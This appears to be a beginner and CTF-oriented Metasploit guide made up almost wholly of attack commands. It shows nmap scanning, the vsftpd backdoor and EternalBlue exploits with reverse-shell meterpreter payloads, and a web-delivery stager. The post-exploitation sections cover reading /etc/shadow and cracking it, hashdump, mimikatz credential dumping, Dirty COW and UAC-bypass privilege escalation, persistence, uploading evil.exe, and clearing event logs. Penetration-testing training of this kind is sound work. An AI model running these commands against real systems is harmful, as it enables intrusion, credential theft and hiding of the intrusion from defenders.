---
title: "Metasploit Practical Guide (for Beginners and CTF use)"
date: 2026-01-13
tags: ['metasploit', 'security-testing', 'post-exploitation', 'reverse-shell', 'payload-generation', 'nmap', 'hashdump', 'penetration-testing', 'ctf', 'metasploit-framework', 'security', 'web-security', 'sql-injection', 'red-teaming', 'ethical-hacking-community', 'python-scripting', 'powershell-reverse-shell', 'reverse-shell-techniques', 'shell-encoding', 'socat', 'runascs', 'code-snippets', 'cross-platform', 'shell-scripting', 'jsp', 'war-file', 'msfvenom', 'nodejs-exploitation', 'file-inclusion', 'PathTraversal', 'php-filters', 'htaccess-exploitation', 'RFI', 'php-filter', 'local-file-inclusion', 'URL_Encoding', 'path-traversal', 'log-poisoning', 'HTTP', 'StatusCode', 'bug-bounty', 'web-fuzzing', 'directory-bruteforce', 'http-status-codes', 'ffuf', 'fuzzing', 'parameter-fuzzing', 'api-testing', 'vhost-enum', 'http-methods', 'proxy', 'rate-limiting', 'content-discovery', 'ctf-tools', 'ffuf-tool', 'metasploit-tutorial', 'ctf-guide']
---

# 🌐 1.Start Metasploit Console

```bash
sudo systemctl start postgresql
msfconsole
```

## Initialize the Metasploit Database (First Time Only)

```bash
msfdb init
```

---

# 🔍 2. Scanning Targets

### Quick Target Discovery

```bash
nmap -sn 10.10.10.0/24
```

### Full Port + Version Scan (Integrated with Metasploit DB)

```bash
db_nmap -sC -sV -O -Pn 10.10.10.129
```

### View Discovered Hosts & Services

```bash
hosts
services
```

---

# 🪡 3. Exploit Search and Module Use

### Search by service name or CVE

```bash
search vsftpd
search type:exploit name:smb
```

### Load a Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Explore Module Info

```bash
info        # Shows full module details (author, platform, options, etc)
show options   # Required + optional settings (RHOSTS, LHOST, etc)
show advanced  # Advanced options like threads, timeouts, proxies
show payloads  # Compatible payloads for this exploit
```

---

# 💡 4. Linux Exploitation Workflow

## Example: FTP Backdoor

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.129
set payload cmd/unix/interact
run
```

### If Shell is Basic: Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Or Use Web Delivery

```bash
use exploit/multi/script/web_delivery
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

---

## Post-Exploitation (Linux)

```bash
sessions -i 1
getuid
sysinfo
```

### Enumerate OS and Configs

```bash
run post/linux/gather/enum_os
run post/linux/gather/enum_configs
```

### Dump Password Hashes

```bash
download /etc/passwd
download /etc/shadow
john shadow --wordlist=/usr/share/wordlists/rockyou.txt
```

### Local Exploit Suggestion

```bash
run post/multi/recon/local_exploit_suggester
```

### Example Local Root Exploit

```bash
use exploit/linux/local/dirty_cow
set SESSION 1
run
```

### Confirm Root

```bash
id
whoami
```

---

# 💻 5. Windows Exploitation Workflow

## Example: EternalBlue

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.130
set LHOST <your_ip>
set payload windows/x64/meterpreter/reverse_tcp
run
```

### Session Handling

```bash
sessions
sessions -i 1
sysinfo
getuid
```

### Post-Exploitation (Windows)

#### Dump Hashes

```bash
hashdump
load kiwi
kiwi_cmd "lsadump::sam"
```

#### Process Migration

```bash
ps
migrate <pid>
getpid
```

#### Privilege Escalation

```bash
getsystem
```

Or use:

```bash
use exploit/windows/local/bypassuac
set SESSION 1
run
```

#### Suggested Priv Esc Modules

```bash
run post/windows/escalate/ms10_015_kitrap0d
```

#### Credential Dumping

```bash
kiwi_cmd "creds_wdigest"
kiwi_cmd "kerberos::list"
```

#### Persistence

```bash
run persistence -U -i 5 -p 4444 -r <your_ip>
```

#### Clear Logs

```bash
clearev
```

---

# 📁 6. Metasploit File Management

### Upload / Download Files

```bash
upload evil.exe
download C:\\Users\\Admin\\Desktop\\flag.txt
```

---

# 🔮 7. Cheatsheet Commands

| Task                 | Command                         |
| -------------------- | ------------------------------- |
| Start console        | `msfconsole`                    |
| Scan w/ nmap         | `db_nmap -sC -sV <ip>`          |
| List hosts/services  | `hosts`, `services`             |
| Search module        | `search <name>`                 |
| Use module           | `use <exploit>`                 |
| Show options         | `show options`, `show advanced` |
| Show payloads        | `show payloads`                 |
| Run exploit          | `run` or `exploit`              |
| Manage sessions      | `sessions -i <id>`              |
| Hashdump             | `hashdump`                      |
| Post modules         | `run post/...`                  |
| Load Kiwi (mimikatz) | `load kiwi`                     |
| File actions         | `upload`, `download`            |
| Clean logs (Windows) | `clearev`                       |

---

# 🚀 Tools + Resources

* `searchsploit`: offline exploit search
* `john`: password cracking
* `nmap`: port scanning
* `linpeas.sh`, `winpeas.exe`: manual privilege escalation
* `LOLBAS`: Windows native bin abuse
* `GTFOBins`: Linux privilege escalation